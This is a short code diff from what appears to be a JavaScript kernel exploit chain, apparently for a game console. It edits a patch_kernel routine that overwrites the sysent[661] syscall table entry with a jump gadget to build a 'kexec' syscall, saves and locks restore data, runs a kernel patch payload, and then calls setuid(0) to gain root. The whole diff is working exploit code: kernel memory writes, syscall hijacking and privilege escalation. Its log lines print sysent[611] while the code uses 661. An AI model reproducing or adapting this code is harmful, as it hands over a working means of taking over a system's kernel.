@@ -1519,9 +1519,13 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   log("change sys_aio_submit() to sys_kexec()");
   // sysent[661] is unimplemented so free for use
   const sysent_661 = kbase.add(off_sysent_661);
-  const sy_narg = kmem.read32(sysent_661);
-  const sy_call = kmem.read64(sysent_661.add(8));
-  const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
+  const sysent_661_save = new Buffer(0x30); // sizeof syscall
+  for (let off = 0; off < sysent_661_save.size; off += 8) {
+    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
+  }
+  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
+  log("sysent[611] save data:");
+  hexdump(sysent_661_save);
   // .sy_narg = 6
   kmem.write32(sysent_661, 6);
   // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1583,22 +1587,24 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     die("test jit exec failed");
   }
 
+  log("mlock save data for kernel restore");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
-  log("mlock pipe save data for kernel restore");
   sysi("mlock", restore_info[1], page_size);
+  restore_info[4] = sysent_661_save.addr;
+  sysi("mlock", restore_info[4], page_size);
 
+  log("execute kpatch...")
   mem.cpy(write_addr, patches.addr, patches.size);
   sys_void("kexec", exec_addr, ...restore_info);
+
+  log("munlock save data used in kernel restore");
+  sysi("munlock", restore_info[1], page_size);
+  sysi("munlock", restore_info[4], page_size);
 
   log("setuid(0)");
   sysi("setuid", 0);
   log("kernel exploit succeeded!");
-
-  kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-  kmem.write64(sysent_661.add(8), sy_call);
-  kmem.write32(sysent_661, sy_narg);
-  log("restored sys_aio_submit()");
 }
 
 // FUNCTIONS FOR STAGE: SETUP
